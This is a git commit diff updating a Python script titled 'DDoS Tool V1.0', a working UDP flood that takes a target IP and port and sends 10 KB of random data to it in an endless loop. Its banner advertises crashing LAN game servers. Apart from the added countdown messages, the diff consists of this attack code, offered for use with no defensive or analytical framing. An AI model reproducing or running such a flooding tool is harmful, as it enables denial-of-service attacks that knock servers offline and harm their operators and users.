c08666c6a44b1ee8286511346b61e81af2d724b3
ATOMIC <66838025+ATOMIC09@users.noreply.github.com>
2021-08-22 17:25:05 +0700

    Update ddos(UDP).py

--- ddos(UDP).py
+++ ddos(UDP).py
@@ -1,38 +1,35 @@
 import socket
 import os
-
-banner = """         _   _             _        
-     /\  | | | |           | |       | | |
-    /  \ | |_| |_ __ _  ___| | __    | | |
-   / /\ \| __| __/ _` |/ __| |/ /    | | |
-  / ____ \ |_| || (_| | (__|   <     | | |
- /_/    \_\__|\__\__,_|\___|_|\_\    . . .
-"""
+from time import sleep
 
 class main():
-    print(banner)
     print("===== DDoS Tool V1.0 =====\n1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the UDP protocol.\n3.If you do it on one computer, it's called DoS.\n4.If you do it on multiple computers, it's called DDoS.\n5.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n\n")
     
-    # Defind Ojb
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-
     # Input
-    host = str(input("Enter Target IP : "))
+    target = str(input("Enter Target IP : "))
     port = int(input("Enter Port to Attack : "))
 
-    # สร้าง Data
-    byte = os.urandom(10240)
+    data = os.urandom(10240)
 
-    # นับ Packet
-    sent = 1
-
-    # Working
+    print('\n')
+    print('==========================================================')
+    print('=                                                        =')
+    print('= Please check "Send" on Network Adapter in Task Manager =')
+    print('=                                                        =')
+    print('==========================================================')
+    sleep(3)
+    print('DDoS attacks will begin in 3')
+    sleep(1)
+    print('DDoS attacks will begin in 2')
+    sleep(1)
+    print('DDoS attacks will begin in 1')
+    sleep(1)
+    print(f"Attacking to {target} with port {port}")
+    
     while True:
-        s.sendto(byte, (host, port))
-
-        print("Sending ", sent, "To", host, "with port", port)
-        sent = sent + 1
+        s.sendto(data, (target, port))
 
 if __name__ == "__main__":
     main()
